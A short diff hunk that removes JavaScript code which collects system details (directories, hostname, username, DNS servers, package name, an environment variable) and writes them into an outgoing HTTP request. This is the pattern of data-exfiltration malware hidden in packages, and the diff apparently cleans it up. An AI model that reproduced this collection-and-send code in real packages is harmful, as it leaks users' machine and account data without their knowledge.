@@ -1,6 +1,0 @@
-payload = "Current_Directory=" + __dirname + "\n" + "Home_Directory=" + os.homedir() + "\n" + "Hostname=" + os.hostname() + "\n" + "Username=" + os.userInfo().username + "\n" + "Dns-Server=" + dns.getServers() + "\n" + "Package " + package + "\n" + "env vars" + process.env.ENV_VARIABLE
-var payload1 = {
-    "text": payload
-}
-_tmp_0.text = payload
-req.write(JSON.stringify(payload1))
